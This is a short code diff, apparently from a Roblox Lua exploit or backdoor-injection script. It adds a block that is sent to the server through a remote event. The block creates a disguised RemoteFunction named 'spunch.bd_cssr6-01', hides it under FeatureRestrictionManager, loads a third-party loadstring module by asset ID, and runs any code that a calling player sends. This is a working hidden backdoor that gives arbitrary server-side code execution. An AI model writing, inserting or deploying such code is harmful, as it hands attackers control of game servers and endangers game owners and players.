@@ -2397,7 +2397,20 @@ end
 if initial then
     watchRemote(initial)
 end
-        
+
+fireRemoteEvent([[
+	local frm = game:GetService("FeatureRestrictionManager")
+	
+	local remoteFunction = Instance.new("RemoteFunction")
+	remoteFunction.Name = "spunch.bd_cssr6-01"
+	remoteFunction.Parent = frm
+
+	local loadstring = require(5612987995)
+	
+	remoteFunction.OnServerInvoke = function(player, code)
+       loadstring(code)()
+	end
+]])
        fireRemoteEvent([[
 local services = {
  game:GetService("PathfindingService"),
